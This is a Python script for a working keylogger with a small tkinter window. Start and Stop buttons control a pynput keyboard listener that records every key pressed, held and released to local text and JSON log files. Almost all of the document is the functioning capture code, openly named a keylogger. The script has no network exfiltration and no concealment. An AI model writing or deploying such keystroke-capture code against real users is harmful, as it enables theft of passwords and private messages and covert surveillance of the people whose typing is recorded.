from tkinter import CENTER as _CENTER
from tkinter import RIGHT as _RIGHT
from tkinter import LEFT as _LEFT
from tkinter import Tk as _Tk
from tkinter import Button as _Button
from tkinter import Label as _Label
from pynput import keyboard as _keyboard
from typing import Any as _Any

from json import dumps as _dumps

from typing import Optional
keys_used: Optional[list] = []# Python 3.9
#keys_used: list | None = [] # Python 3.12+
flag: bool = False
keys: str = ""

def generate_text_log(key: _Any)-> None:
    with open("./out/key_log.txt", "w+") as KEYS:
        KEYS.write(key)

def generate_json_file(used_key: _Any)-> None:
    with open("./out/key_log.json", "+wb") as key_log:
        key_list_byte = _dumps(used_key).encode()
        key_log.write(key_list_byte)

def on_press(key:_Any)->None:
    global flag, keys_used,keys
    if not flag:
        keys_used.append({"Pressed":f"{key}"})
        flag = True
    if flag:
        keys_used.append({"Held":f"{key}"})
    generate_json_file(keys_used)

def on_release(key:_Any)->None:
    global flag, keys_used,keys
    keys_used.append({"Released": f"{key}"})
    if flag:
        flag = False
    generate_json_file(keys_used)
    keys = keys+str(key)
    generate_text_log(str(keys))

_LISTNER = _keyboard.Listener(on_press=on_press, on_release=on_release)

def start_keylogger():
    listener = _LISTNER
    listener.start()
    label.config(
        text="[+] Keylogger Started\n[!] Saving in 'key_log.txt'"
    )
    start_button.config(state="disabled")
    stop_button.config(state="normal")

def stop_keylogger():
    listener = _LISTNER
    listener.stop()
    label.config(text="[-] Keylogger Stopped")
    start_button.config(state="normal")
    stop_button.config(state="disabled")

if __name__ == "__main__":
    root = _Tk()
    root.title("Keylogger")

    label = _Label(root, text="Click 'Start' to begin key logging")
    label.config(anchor=_CENTER)
    label.pack()

    start_button = _Button(root, text="Start", command=start_keylogger)
    start_button.pack(side=_LEFT)

    stop_button = _Button(root, text="Stop", command=stop_keylogger, state="disabled")
    stop_button.pack(side=_RIGHT)

    root.geometry("250x250")
    root.mainloop()